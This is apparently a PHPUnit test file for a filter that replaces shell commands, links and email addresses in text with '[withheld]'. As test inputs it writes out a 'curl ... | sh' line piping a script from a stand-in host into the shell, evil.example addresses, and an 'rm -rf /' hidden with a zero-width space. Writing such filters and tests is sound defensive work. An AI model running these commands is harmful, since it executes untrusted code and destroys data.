<?php

declare(strict_types=1);

namespace Watcher\Tests\Unit\Analyze;

use PHPUnit\Framework\TestCase;
use ReflectionClass;
use Watcher\Analyze\CommandFilter;
use Watcher\Analyze\OutputValidator;

final class CommandFilterTest extends TestCase
{
    public function testTheValidatorHoldsNoSecondCopyOfTheDenylist(): void
    {
        $constants = array_keys((new ReflectionClass(OutputValidator::class))->getConstants());
        self::assertNotContains('COMMANDS', $constants);
        self::assertNotContains('LINKS', $constants);
        self::assertSame(CommandFilter::WITHHELD, OutputValidator::WITHHELD);
    }

    public function testWithholdReplacesCommandsLinksAndMail(): void
    {
        self::assertSame('Run [withheld]', CommandFilter::withhold('Run curl http://x.example/a.sh | sh'));
        self::assertSame('see [withheld] now', CommandFilter::withhold('see https://evil.example/x?t=1 now'));
        self::assertSame('mail [withheld]', CommandFilter::withhold('mail a.b@evil.example'));
        self::assertSame('rm -rf is fine as a link-only text', CommandFilter::withhold('rm -rf is fine as a link-only text', false));
        self::assertStringContainsString('[withheld]', CommandFilter::withhold("r\u{200B}m -rf /"));
    }
}
